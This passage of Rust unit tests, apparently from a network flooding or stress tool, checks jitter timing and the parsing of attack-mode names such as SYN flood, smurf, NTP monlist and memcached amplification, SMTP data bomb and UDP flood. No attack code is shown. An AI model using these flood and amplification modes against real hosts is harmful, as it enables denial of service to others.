        jitter_percent.map(|pct| req_delay * pct / 100).unwrap_or(jitter_ms)
    }

    #[test]
    fn jitter_percent_default_is_none() {
        assert_eq!(parse_jitter_percent(&[]), None);
    }

    #[test]
    fn jitter_percent_parsed_space() {
        assert_eq!(parse_jitter_percent(&["--jitter-percent", "10"]), Some(10));
    }

    #[test]
    fn jitter_percent_parsed_equals() {
        assert_eq!(parse_jitter_percent(&["--jitter-percent=25"]), Some(25));
    }

    #[test]
    fn jitter_percent_clamps_negative_to_zero() {
        assert_eq!(parse_jitter_percent(&["--jitter-percent=-5"]), Some(0));
    }

    #[test]
    fn jitter_percent_clamps_over_hundred_to_hundred() {
        assert_eq!(parse_jitter_percent(&["--jitter-percent=150"]), Some(100));
    }

    #[test]
    fn jitter_percent_overrides_fixed_jitter() {
        // Fixed jitter of 50ms is overridden by 10% of 100ms delay -> 10ms.
        assert_eq!(compute_effective_jitter(100, 50, Some(10)), 10);
    }

    #[test]
    fn jitter_percent_none_uses_fixed_jitter() {
        assert_eq!(compute_effective_jitter(100, 50, None), 50);
    }

    #[test]
    fn jitter_percent_zero_produces_no_jitter() {
        assert_eq!(compute_effective_jitter(100, 50, Some(0)), 0);
    }

    #[test]
    fn jitter_percent_deterministic_range() {
        // With a 100ms delay and 10% jitter, the jitter magnitude is exactly 10ms.
        let req_delay = 100u64;
        let pct = 10u64;
        let jitter = compute_effective_jitter(req_delay, 0, Some(pct));
        assert_eq!(jitter, 10);
        // The resulting delay range is deterministic: [90, 110].
        let min_d = req_delay.saturating_sub(jitter);
        let max_d = req_delay.saturating_add(jitter);
        assert_eq!(min_d, 90);
        assert_eq!(max_d, 110);
    }

    // ── Protocol mode parsing tests ──

    #[test]
    fn tcp_mode_from_str_all_variants() {
        use crate::tcp::TcpMode;
        let cases = [
            ("smtp-vrfy", Some(TcpMode::SmtpVrfy)),
            ("smtp-expn", Some(TcpMode::SmtpExpn)),
            ("smtp-rcpt", Some(TcpMode::SmtpRcptTo)),
            ("smtp-data-bomb", Some(TcpMode::SmtpDataBomb)),
            ("ssh-auth", Some(TcpMode::SshAuth)),
            ("ftp-bounce", Some(TcpMode::FtpBounce)),
            ("ftp-list", Some(TcpMode::FtpList)),
            ("finger", Some(TcpMode::Finger)),
            ("imap-login", Some(TcpMode::ImapLogin)),
            ("pop3-login", Some(TcpMode::Pop3Login)),
            ("ldap-search", Some(TcpMode::LdapSearch)),
            ("mqtt-connect", Some(TcpMode::MqttConnect)),
            ("xmpp-stream", Some(TcpMode::XmppStream)),
            ("rtsp-describe", Some(TcpMode::RtspDescribe)),
            ("modbus-tcp", Some(TcpMode::ModbusTcp)),
            ("socks-connect", Some(TcpMode::SocksConnect)),
            ("ssl-reneg", Some(TcpMode::SslReneg)),
            ("telnet-neg", Some(TcpMode::TelnetNeg)),
            ("tcp-connect", Some(TcpMode::GenericConnect)),
            ("generic", Some(TcpMode::GenericConnect)),
            ("tcp-connection-flood", Some(TcpMode::TcpConnectionFlood)),
            ("redis-slave-read", Some(TcpMode::RedisSlaveRead)),
            ("docker-api", Some(TcpMode::DockerApi)),
            ("kerberos-as-req", Some(TcpMode::KerberosAsReq)),
            ("postgres-md5", Some(TcpMode::PostgresMd5Auth)),
            ("cassandra-thrift", Some(TcpMode::CassandraThrift)),
            ("ard-query", Some(TcpMode::ArdQuery)),
            ("cups-ipp-trigger", Some(TcpMode::CupsIppTrigger)),
            ("webhook-chain", Some(TcpMode::WebhookChain)),
            ("unknown-mode", None),
        ];
        for (input, expected) in &cases {
            let result = TcpMode::from_str(input);
            assert_eq!(result, *expected, "TcpMode::from_str({:?})", input);
        }
    }

    #[test]
    fn udp_mode_from_str_all_variants() {
        use crate::udp::UdpMode;
        let cases = [
            ("dns-any", Some(UdpMode::DnsAny)),
            ("dns-ixfr", Some(UdpMode::DnsIxfr)),
            ("ntp-monlist", Some(UdpMode::NtpMonlist)),
            ("ntp-query", Some(UdpMode::NtpQuery)),
            ("memcached-stats", Some(UdpMode::MemcachedStats)),
            ("ssdp", Some(UdpMode::SsdpDiscovery)),
            ("snmp-getbulk", Some(UdpMode::SnmpGetBulk)),
            ("chargen", Some(UdpMode::CharGen)),
            ("qotd", Some(UdpMode::Qotd)),
            ("generic", Some(UdpMode::GenericUdp)),
            ("cldap", Some(UdpMode::CldapSearch)),
            ("coap", Some(UdpMode::CoapAmplification)),
            ("ws-discovery", Some(UdpMode::WsDiscovery)),
            ("portmap", Some(UdpMode::PortmapDump)),
            ("netbios", Some(UdpMode::NetbiosNs)),
            ("mdns", Some(UdpMode::MdnsQuery)),
            ("tftp", Some(UdpMode::TftpRead)),
            ("sip", Some(UdpMode::SipOptions)),
            ("ike", Some(UdpMode::IkeAmplification)),
            ("rip", Some(UdpMode::RipQuery)),
            ("bacnet", Some(UdpMode::BacnetDiscovery)),
            ("ntp-readvar", Some(UdpMode::NtpReadVar)),
            ("dnssec", Some(UdpMode::DnsDnssec)),
            ("dns-recursive-chain", Some(UdpMode::DnsRecursiveChain)),
            ("udp-flood", Some(UdpMode::UdpFlood)),
            ("memcached-get", Some(UdpMode::MemcachedGet)),
        ];
        for (input, expected) in &cases {
            let result = UdpMode::from_str(input);
            assert_eq!(result, *expected, "UdpMode::from_str({:?})", input);
        }
    }

    #[test]
    fn raw_mode_from_str_all_variants() {
        use crate::raw::RawMode;
        let cases = [
            ("tcp-syn-flood", Some(RawMode::TcpSynFlood)),
            ("tcpsyn", Some(RawMode::TcpSynFlood)),
            ("tcp-rst-flood", Some(RawMode::TcpRstFlood)),
            ("icmp-smurf", Some(RawMode::IcmpSmurf)),
            ("icmp-fragmentation", Some(RawMode::IcmpFragmentation)),
            ("ip-frag-overload", Some(RawMode::IpFragOverload)),
            ("arp-flood", Some(RawMode::ArpFlood)),
            ("mac-flooding", Some(RawMode::MacFlooding)),
        ];
        for (input, expected) in &cases {
            let result = RawMode::from_str(input);
            assert_eq!(result, *expected, "RawMode::from_str({:?})", input);
        }
    }

    /// Verify that the catalog's HTTP mode ids all parse as AttackMode
    #[test]
    fn catalog_http_modes_parse_as_attack_mode() {
        use crate::types::AttackMode;
        let fallback_to_normal: Vec<&str> = crate::catalog::METHODS
            .iter()
            .filter(|m| m.layer == crate::catalog::NetworkLayer::Application && m.transport == crate::catalog::TransportType::Tcp)
            .filter_map(|m| m.http_mode)
            .filter(|mode| matches!(AttackMode::from_str(mode), AttackMode::Normal))
            .collect();
        // Some catalog entries legitimately map to Normal (e.g. generic HTTP loadtest)
        // This test just checks that from_str doesn't panic or break for any known catalog entry
        assert!(fallback_to_normal.len() < 10, "Too many HTTP catalog modes fall back to Normal: {:?}", fallback_to_normal);
    }

    /// Verify that the catalog's TCP mode ids all parse as TcpMode
    #[test]
    fn catalog_tcp_modes_parse_as_tcp_mode() {
        let unimplemented: Vec<&str> = crate::catalog::METHODS
            .iter()
            .filter(|m| m.transport == crate::catalog::TransportType::Tcp)
            .filter_map(|m| {
                if m.http_mode.is_some() { return None; } // skip HTTP-over-TCP entries
                let id = m.id;
                if crate::tcp::TcpMode::from_str(id).is_some() { None } else { Some(id) }
            })
            .collect();
        assert!(unimplemented.is_empty(), "TCP catalog ids not parseable as TcpMode: {:?}", unimplemented);
    }

    /// Verify that the catalog's UDP mode ids all parse as UdpMode
    #[test]
    fn catalog_udp_modes_parse_as_udp_mode() {
        let unimplemented: Vec<&str> = crate::catalog::METHODS
            .iter()
            .filter(|m| m.transport == crate::catalog::TransportType::Udp)
            .filter_map(|m| {
                let id = m.id;
                if crate::udp::UdpMode::from_str(id).is_some() { None } else { Some(id) }
            })
            .collect();
        assert!(unimplemented.is_empty(), "UDP catalog ids not parseable as UdpMode: {:?}", unimplemented);
    }

    /// Verify that the catalog's Raw mode ids all parse as RawMode
    #[test]
    fn catalog_raw_modes_parse_as_raw_mode() {
        let unimplemented: Vec<&str> = crate::catalog::METHODS
            .iter()
            .filter(|m| {
                m.transport == crate::catalog::TransportType::Raw
                    || m.transport == crate::catalog::TransportType::Icmp
            })
            .filter_map(|m| {
                let id = m.id;
                if crate::raw::RawMode::from_str(id).is_some() { None } else { Some(id) }
            })
            .collect();
        assert!(unimplemented.is_empty(), "Raw/Icmp catalog ids not parseable as RawMode: {:?}", unimplemented);
    }
}
